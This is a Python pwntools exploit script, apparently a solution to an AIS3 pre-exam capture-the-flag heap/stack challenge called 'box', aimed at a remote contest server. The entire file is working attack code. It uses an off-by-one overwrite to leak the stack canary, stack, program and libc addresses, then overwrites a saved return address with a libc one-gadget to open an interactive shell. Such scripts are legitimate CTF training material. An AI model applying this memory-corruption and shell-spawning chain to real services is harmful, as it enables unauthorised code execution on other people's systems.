#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
libc = ELF('./libc.so.6')

#r = process('./box')
r = remote('pre-exam-pwn.ais3.org', 10006)

def register(acc, pwd):
    r.sendlineafter('>\n', '1')
    r.sendafter('Account: ', acc)
    r.sendafter('Password: ', pwd)

def login(acc, pwd):
    r.sendlineafter('>\n', '2')
    r.sendafter('account: ', acc)
    r.sendafter('Password : ', pwd)

def new_box(s):
    r.sendlineafter('>\n', '1')
    r.sendlineafter('> ', s)

def edit_box(idx, s):
    r.sendlineafter('>\n', '2')
    r.sendlineafter('box?\n', str(idx))
    r.sendafter('> ', s)

def view_box():
    r.sendlineafter('>\n', '3')

def del_box(idx):
    r.sendlineafter('>\n', '4')
    r.sendlineafter('box?\n', str(idx))

def logout_box():
    r.sendlineafter('>\n', '5')

register('A', 'A')
login('A', 'A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
del_box(6)
new_box('A'*232)
edit_box(7, 'A'*232+'G')
del_box(5)
new_box('A'*232)
edit_box(6, 'A'*232 + '\xff')
view_box()
r.recvuntil('G')
canary = '\x00' + r.recvn(7)
stack = u64(r.recvn(6).ljust(8, '\x00'))
#new_rbp = stack + 0x6c0
new_rbp = stack - 0x1000
print hex(stack)

edit_box(7, 'A'*247+'G')
view_box()
r.recvuntil('G')
text_base = u64(r.recvn(6).ljust(8, '\x00')) - 0x123f
login_mid = text_base + 0xd85
print hex(text_base)

# max 255-1 = 254 char
edit_box(7, 'A'*232 + canary + p64(new_rbp) + p64(login_mid)[:6])
logout_box()
del_box(0)
del_box(1)
del_box(2)
new_box('/bin/sh')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
del_box(5)
new_box('A'*232)
edit_box(6, 'A'*232+'\xff')
edit_box(7, 'A'*183+'G')
view_box()
r.recvuntil('G')
libc_base = u64(r.recvn(6).ljust(8, '\x00')) - 0x8d148
magic = libc_base + 0x10a38c
print hex(libc_base)

edit_box(7, 'A'*232 + canary + 'DEADBEEF' + p64(magic)[:6])
r.interactive()
